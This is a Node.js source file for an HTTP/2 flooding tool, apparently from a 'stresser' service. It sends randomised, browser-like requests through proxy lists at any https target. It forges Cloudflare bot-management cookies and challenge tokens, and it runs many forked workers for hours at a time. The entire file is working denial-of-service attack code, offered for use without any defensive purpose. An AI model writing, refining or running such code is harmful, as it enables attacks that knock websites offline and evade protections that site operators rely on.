const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const cluster = require('cluster');
const fs = require('fs');
const url = require('url');
const os = require('os');
const http2 = require('http2-wrapper');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
	.setMaxListeners(0)
	.on('uncaughtException', function (e) {
		if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
	})
	.on('unhandledRejection', function (e) {
		if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
	})
	.on('warning', e => {
		if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
	})
	.on("SIGHUP", () => {
		return 1;
	})
	.on("SIGCHILD", () => {
		return 1;
	});

const blockedDomains = [".zxn", ".zxm"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const currentDate = new Date();
const targetDate = new Date('2090-03-16');

const mode = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;

if (!mode || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`Bypass method Updated: 01.02.2025 // With love @Mrcyberteam for Executor Stresser`);
    console.log(`Example: node bypass.js GET https://target.com?q=%RAND% 120 16 proxy.txt --query 1 --cookie uh=good --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --randrate`);
    console.error(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> (options: --query 1/2/3 --delay <1-100> --cookie f=f --bfm true/false --referer rand / https://target.com --postdata "user=f&pass=f" --randrate)`);
    process.exit(1);
}

let hcookie = '';

const parsed = url.parse(target);
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

if (currentDate > targetDate) {
    console.error('Error method has been outdate pm @Mrcyberteam');
    process.exit(1);
}	

if (!['GET', 'POST'].includes(mode)) {
    console.error('Error request method only can GET/POST');
    process.exit(1);
}

if (blockedDomains.some(domain => parsed.host.endsWith(domain))) {
    console.log(`Domain ${parsed.host} is blocked. If this is a mistake, please contact @Mrcyberteam`);
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if(isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if(isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads can not high 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 128) {
    console.error('Error ratelimit can not high 128');
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
	hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

function generateRandomString(minLength, maxLength) {
	const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
	let result = '';
	for (let i = 0; i < length; i++) {
		const randomIndex = Math.floor(Math.random() * characters.length);
		result += characters[randomIndex];
	}
	return result;
}

    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}


    if (parsed.path.includes("%RAND%")) {
        const randomValue = randstr(6) + "&" + randstr(6);
        parsed.path = parsed.path.replace("%RAND%", randomValue);
    }

function randstrr(length) {
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
	result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}

function getRandomToken(length) {
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
let token = '';
for (let i = 0; i < length; i++) {
	token += chars.charAt(Math.floor(Math.random() * chars.length));
}
return token;
}

const getRandomInt = (min, max) => {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  };


  const headers = (hcookie, jsondata, index) => {
    // Update the range for browser versions
    const browserVersion = getRandomInt(119, 125); // Extend to the latest versions for 2024
    const fwfw = ['Google Chrome', 'Brave'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
    const nt = getRandomInt(0, 4);

    let brandValue;
    switch (browserVersion) {
        case 119:
            brandValue = `"Not?A_Brand";v="24", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            break;
        case 120:
            brandValue = `"Not_A_Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            break;
        case 121:
            brandValue = `"Not A(Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
            break;
        case 122:
            brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
            break;
        case 123:
            brandValue = `"Chromium";v="${browserVersion}", "Google Chrome";v="${browserVersion}"`; // Example for 123
            break;
        case 124:
            brandValue = `"Not?A_Brand";v="24", "Chromium";v="${browserVersion}", "Brave";v="${browserVersion}"`; // Example for 124
            break;
        case 125:
            brandValue = `"Google Chrome";v="${browserVersion}", "Chromium";v="${browserVersion}", "Not_A_Brand";v="99"`; // Example for 125
            break;
        default:
            brandValue = `"Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

    const secGpcValue = isBrave ? "1" : undefined;

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + getRandomToken(6) + ".net" : refererValue;

    const header = {
        ':method': mode,
        ':authority': parsed.host,
        ':scheme': 'https',
        ":path": query ? handleQuery(query) : parsed.path + (postdata ? `?${postdata}` : ""),
        ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
        ...(mode === "POST" && { "content-length": "0" }),
        ...(Math.random() < 0.9 && { "priority": `u=${nt}, i` }),
        "sec-ch-ua": secChUa,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": `"Windows"`,
        "upgrade-insecure-requests": "1",
        "user-agent": userAgent,
        "accept": acceptHeaderValue,
        ...(secGpcValue && { "sec-gpc": secGpcValue }),
        ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? "same-origin" : "none" }),
        ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
        ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.7",
        ...(hcookie && { "cookie": hcookie }),
        ...(currentRefererValue && { "referer": currentRefererValue }),
        ...(Math.random() < 0.3 && { 'x-client-session': 'none' }),
        ...(Math.random() < 0.3 && { 'sec-fetch-users': '?0' }),
        ...(Math.random() < 0.3 && { 'x-request-data': 'dynamic' }),
        ...(Math.random() < 0.1 && { 'x-requested-with': 'XMLHttpRequest' })
    };

    return header;
};

function handleQuery(query) {
    if (query === '1') {
        return parsed.path + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
    } else if (query === '2') {
        return parsed.path + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else if (query === '3') {
        return parsed.path + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    } else {
        return parsed.path;
    }
}

const agent = new http.Agent({
    keepAlive: true,
	keepAliveMsecs: 50000,
	maxSockets: Infinity,
    maxFreeSockets: Infinity,
	maxTotalSockets: Infinity,
    timeout: time * 1000,
});

const work = async () => {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    const request = http.get({
        method: 'CONNECT',
        host: proxyHost,
        port: proxyPort,
        agent,
        path: `${parsed.host}:443`,
        headers: {
            'Proxy-Connection': 'Keep-Alive'
        },
        rejectUnauthorized: true,
    });

    request.on('error', request.destroy);

    request.on('connect', (res, socket, { head }) => {
        if (head?.length) return socket.destroy();

        const ciphers = ["TLS_AES_128_GCM_SHA256", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"].join(":");
        const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
        const sessionOptions = {
            createConnection: (authority, option) => tls.connect({
                ...option,
                socket,
                servername: parsed.host,
                session: head,
                agent,
                secure: true,
                requestOCSP: true,
                ALPNProtocols: ["h2","http/1.1","http/1.2","http/1.0"],
                ciphers: ciphers,
                sigalgs: sigalgs,
                requestCert: true,
            }),
            settings: {
                headerTableSize: Math.random() < 0.5 ? 65535 : 65536,
                enablePush: false,
                initialWindowSize: Math.random() < 0.5 ? 6291456 : 6291457,
                maxHeaderListSize: Math.random() < 0.5 ? 262144 : 262145,
            },
        };

        const sessionState = { flags: 0 };

        const session = http2.connect(`https://${parsed.host}`, sessionOptions, () => {
            session.setLocalWindowSize(15663105);
        });

        let activeRequests = 0;
        let timeoutHandle;

        const resetTimeout = () => {
            clearTimeout(timeoutHandle);
            timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
        };

        const closeSessionIfDone = () => {
            if (!activeRequests) {
                sessionState.flags |= 1;
                session.destroy();
            }
        };

        session.on('error', () => {
            sessionState.flags |= 1;
            session.destroy();
        });

        session.on('connect', () => {
            let ratelimit;
            if (randrate !== undefined) {
                ratelimit = getRandomInt(27, 61);
            } else {
                ratelimit = process.argv[6];
            }
            Array.from({ length: ratelimit }).forEach((_, index) => {
                const isFirstRequest = index === 0;
                const headersData = getHeaders(hcookie, isFirstRequest);
                requestHandler(session, headersData, index);
            });
            resetTimeout();
        });

        const getHeaders = (hcookie, jsondata, index) => headers(hcookie, jsondata, index);
        const requestHandler = (session, headersData, index) => {
            const req = session.request(headersData);
            req.setEncoding('utf8');
            req.end();

            function finalizeRequest() {
                activeRequests--;
                closeSessionIfDone();
            }

            req.on('ready', () => {
                finalizeRequest();
            });

            req.on('headers', (headers) => {
                finalizeRequest();
            });

            req.on('data', (chunk) => { });

            req.on('end', finalizeRequest);

            req.on('error', (err) => {
                finalizeRequest();
            });
        };
    });

    request.end();
};

if (cluster.isMaster) {
console.log('Attack Start! / @Mrcyberteam like youu <3 / BYPASS');
Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

cluster.on('exit', (worker) => {
	cluster.fork({ core: worker.id % os.cpus().length });
});

setTimeout(() => process.exit(1), time * 1000);
} else {
setInterval(work, delay);
setTimeout(() => process.exit(1), time * 1000);
}